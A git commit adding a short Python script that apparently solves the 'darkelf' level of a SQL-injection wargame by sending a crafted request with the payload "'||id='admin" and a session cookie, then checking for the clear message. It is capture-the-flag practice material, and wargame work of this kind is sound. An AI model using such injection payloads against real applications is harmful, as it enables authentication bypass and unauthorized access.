c592706d9be2c21cec8925c4a7167c31368baba8
otaku_LIFE <chaneyoon@gmail.com>
2016-11-06 22:30:22 +0900

    Create 6_DarkElf.py

---
+++ 6_DarkElf.py
@@ -0,0 +1,18 @@
+# - *- coding : UTF-8 -*-
+from requests import get
+
+#URL을 설정합니다.
+url = "http://los.eagle-jump.org/darkelf_6e50323a0bfccc2f3daf4df731651f75.php"
+param = "?pw=%27||id=%27admin"
+new_url = url + param
+
+#쿠키를 설정합니다. 쿠키는 반드시 자신의 것이어야합니다.
+cookies = dict(PHPSESSID="5u71g5vp7547tv8ffl7osl0fl5")
+
+
+#HTTP 요청을 보냅니다.
+r = get(new_url, cookies=cookies)
+
+if r.text.find("<h2>DARKELF Clear!</h2>") > 0:
+    print("축하합니다! DarkElf를 클리어했습니다!")
+    
